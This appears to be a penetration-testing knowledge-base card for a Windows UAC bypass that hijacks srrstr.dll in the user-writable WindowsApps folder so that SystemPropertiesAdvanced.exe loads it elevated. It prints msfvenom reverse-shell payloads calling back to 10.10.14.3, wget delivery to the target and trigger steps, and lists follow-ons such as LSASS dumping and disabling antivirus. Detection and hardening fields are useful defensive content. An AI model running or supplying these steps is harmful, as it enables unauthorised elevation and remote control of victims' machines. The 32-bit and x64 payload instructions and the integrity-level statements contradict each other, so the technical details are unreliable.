examples.command: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

examples.label: Place it in the WindowsApps path

notes:
=== UAC Bypass — DLL Hijacking via SystemPropertiesAdvanced.exe ===
Auto-elevating trusted binary loads missing DLL from user-writable PATH location.

=== TECHNICAL MECHANISM ===
SystemPropertiesAdvanced.exe (32-bit, in C:\Windows\SysWOW64):
- Is an auto-elevating binary (manifest marks it as auto-elevate)
- Windows elevates it without a UAC consent prompt because it's a signed Microsoft binary
- When launched, it attempts to load srrstr.dll (System Restore) but it doesn't exist in expected paths
- Windows DLL search order includes WindowsApps directory
- WindowsApps (C:\Users\<user>\AppData\Local\Microsoft\WindowsApps) is in PATH and WRITABLE by current user
- Malicious srrstr.dll placed there gets loaded in the already-elevated process context

=== ATTACK FLOW ===
Step 1: Generate 32-bit reverse shell DLL (must match 32-bit process)
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o srrstr.dll

Step 2: Deliver to writable PATH location
  python3 -m http.server 8080
  (on target) wget http://<IP>:8080/srrstr.dll -O C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll

Step 3: Test execution at standard level (verify DLL works before triggering elevation)
  rundll32 shell32.dll,Control_RunDLL srrstr.dll
  → Should get callback at current integrity level (confirms delivery + connectivity)

Step 4: Kill test processes
  taskkill /IM rundll32.exe /F

Step 5: Trigger auto-elevation
  C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
  → Process auto-elevates, loads srrstr.dll from WindowsApps, callback arrives elevated

=== RESULT ===
Shell running as same user BUT with full administrator token active (high integrity)
whoami /priv shows full privilege set including SeImpersonatePrivilege, SeDebugPrivilege, etc.

=== BUILD SPECIFICITY ===
UACME Technique 54 — tested on build 14393 (Windows 10 1607)
Always check Windows build before selecting bypass: [environment]::OSVersion.Version
Other techniques at https://github.com/hfiref0x/UACME for other builds

=== CHAINING CONTEXT ===
UAC bypass → elevated token → SeLoadDriverPrivilege for Print Operators (Capcom chain)
UAC bypass → elevated token → SeDebugPrivilege → LSASS dump
UAC bypass → elevated token → SeImpersonate → Potato attacks
UAC bypass → elevated token → Enable RDP, disable AV, deploy persistence
This is always a prerequisite step, not a final destination

recommended.note: Confirms UAC state and build compatibility.

name: UAC Bypass - SystemPropertiesAdvanced DLL Hijack
description: An auto-elevating binary loads srrstr.dll from a user-writable WindowsApps path. Drop a malicious srrstr.dll there and launch SystemPropertiesAdvanced.exe to run code in a high-integrity context (egre55 technique).

defense.why_it_works: SystemPropertiesAdvanced.exe is a UAC auto-elevation binary (marked with autoElevate in its manifest). It loads srrstr.dll at medium integrity. Windows DLL search order checks the application directory before System32. Since the application directory is in WindowsApps (accessible via PATH), a malicious srrstr.dll placed there is loaded instead of the legitimate System32 one. The DLL runs in the auto-elevated process at high integrity — bypassing UAC without a consent prompt.
defense.prerequisites: Standard user with a local account (not a domain admin). Windows 10 x64. PATH includes %LOCALAPPDATA%\Microsoft\WindowsApps before System32. Ability to write to the WindowsApps directory.
defense.impact: UAC bypass leading to high-integrity shell execution without UAC consent prompt. Enables further privilege escalation using high-integrity tools.
defense.detection: Malicious DLL dropped in WindowsApps directory. SystemPropertiesAdvanced.exe execution at unexpected times. DLL load audit: srrstr.dll loaded from WindowsApps instead of System32. Sysmon Event 7: DLL loaded from non-standard path.
defense.artifacts: File: srrstr.dll in %LOCALAPPDATA%\Microsoft\WindowsApps | Process: SystemPropertiesAdvanced.exe loading unexpected DLL | Sysmon Event 7: image load from WindowsApps | Shell: elevated process spawned without UAC prompt
defense.prevention: Set UAC to 'Always notify' (ConsentPromptBehaviorAdmin = 2) — highest level prevents auto-elevation bypass. Ensure PATH does not include user-writable directories before System32. Windows 11 tightened this specific bypass — update from Windows 10.
defense.misconfiguration: UAC configured below maximum level (default Windows 10 allows auto-elevation of manifested binaries). %LOCALAPPDATA%\Microsoft\WindowsApps in PATH before System32. User can write to WindowsApps directory.
defense.vulnerable_config:
# Check UAC level:
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# ConsentPromptBehaviorAdmin = 5 <- vulnerable (not max level)

# UAC bypass:
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o srrstr.dll LHOST=10.10.14.3 LPORT=8443
copy srrstr.dll '%LOCALAPPDATA%\Microsoft\WindowsApps\'
SystemPropertiesAdvanced.exe  # loads srrstr.dll, returns elevated shell
defense.secure_config:
# Set UAC to Always Notify:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f

# Or via GPO: Computer Configuration > Windows Settings > Security Settings
# > Local Policies > Security Options
# > UAC: Behavior of the elevation prompt for administrators = Prompt for credentials

# Monitor WindowsApps directory for new DLLs
